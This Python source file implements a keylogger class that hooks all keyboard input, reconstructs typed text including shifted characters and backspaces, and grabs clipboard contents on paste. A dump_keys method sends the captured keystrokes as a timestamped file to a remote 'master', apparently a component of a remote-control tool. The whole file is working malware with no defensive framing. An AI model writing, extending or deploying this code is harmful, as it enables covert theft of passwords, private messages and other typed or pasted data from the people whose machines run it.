import time
import keyboard
import pyperclip

class KeyLog:
    def __init__(self):
        self.last_key = ''
        self.buffer = []  # Buffer to hold key presses
        self.last_write_time = [time.time()]  # Time we last wrote to the file
        self.last_key_time = [time.time()]  # Time of last key press
        self.key_listener_thread = None
        self.start_logging()

    def log_key(self, event):

        current_time = time.time()

        # Check if more than 5 seconds have passed since the last key press
        if current_time - self.last_key_time[0] > 5:
            self.buffer.append('\n')
        elif event.name == 'space':
            self.buffer.append(' ')
        elif event.name == 'enter':
            self.buffer.append('\n')
        elif event.name == 'backspace' and self.buffer:
            self.buffer.pop()  # remove the last character from the buffer
        elif event.name in ['ctrl', 'alt', 'win', 'left windows', 'right windows', 'delete']:
            self.last_key = event.name
        else:
            if self.last_key == 'ctrl' and event.name == 'v':
                clipboard_content = pyperclip.paste()
                self.buffer.append(clipboard_content)
                self.last_key = ''  # clear the last_key variable
            elif self.last_key in ['shift', 'right shift', 'left shift']:
                self.buffer.append(event.name.upper())
                self.last_key = ''  # clear the last_key variable
            else:
                if event.name not in ['shift', 'right shift', 'left shift', 'ctrl', 'alt', 'win', 'left windows',
                                      'right windows', 'delete']:
                    self.buffer.append(event.name)
                self.last_key = event.name

        self.last_key_time[0] = current_time

    def start_logging(self):
        keyboard.on_press(self.log_key)

    def dump_keys(self, master, address):
        # Convert the buffer to bytes
        keys_bytes = ''.join(self.buffer).encode('utf-8')
        # buffer.clear()  # Clear the buffer

        # Send the file data to the master
        # Get the current timestamp
        current_time = time.localtime()
        timestamp = time.strftime("%d-%m-%y_%H-%M", current_time)
        file_name = f'keys_{timestamp}.txt'
        master.send_file_to_master(address, file_name, keys_bytes)

